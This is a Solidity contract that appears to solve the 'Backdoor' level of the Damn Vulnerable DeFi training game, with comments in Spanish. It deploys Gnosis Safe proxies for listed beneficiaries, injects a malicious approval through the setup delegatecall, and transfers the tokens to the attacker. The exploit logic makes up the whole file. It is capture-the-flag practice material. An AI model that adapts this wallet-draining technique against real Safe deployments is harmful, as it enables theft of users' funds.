// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../11_backdoor/WalletRegistry.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

contract BackdoorModule {
  address public attacker;
  address public _GnosisSingleton;
  GnosisSafeProxyFactory public _factory;
  IERC20 public _token;
  WalletRegistry public _walletRegistry;

  constructor (address singleton, GnosisSafeProxyFactory factory, IERC20 token, WalletRegistry walletRegistry) {
    attacker = msg.sender;
    _GnosisSingleton = singleton;
    _factory = factory;
    _token = token;
    _walletRegistry = walletRegistry;
  }

  function approveTenDVT(address tokenAddress, address moduleAddress) public {
    // _token.approve(attacker, type(uint256).max);
    DamnValuableToken(tokenAddress).approve(moduleAddress, 10 ether);
  }

  function attack(address[] memory usuarios, bytes memory dataParaSetup) public {
    console.log("DENTRO DEL MODULO");
    //Es necesario crear cada wallet gnosis para cada usuario.
    for (uint256 index = 0; index < usuarios.length; index++) {
      address[] memory victima = new address[](1);
      victima[0] = usuarios[index];
      
      // Preparar el encoding para createProxyWithCallback, incluyendo la data maliciosa a incluir con el método approveTenDVT.
      bytes memory initializerParaGnosis = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",
        victima,
        uint256(1),
        address(this),
        dataParaSetup,
        address(0),
        address(0),
        uint256(0),
        address(0)
      );

      // Crear el proxy con la factory y el setupData.
      GnosisSafeProxy proxy = _factory.createProxyWithCallback(_GnosisSingleton, initializerParaGnosis, 0, _walletRegistry);

      // Transferir desde el GnosisProxy creado los 10 DVT que se aprobaron con la data maliciosa.
      _token.transferFrom(address(proxy), attacker, _token.balanceOf(address(proxy)));
    }
  } 

}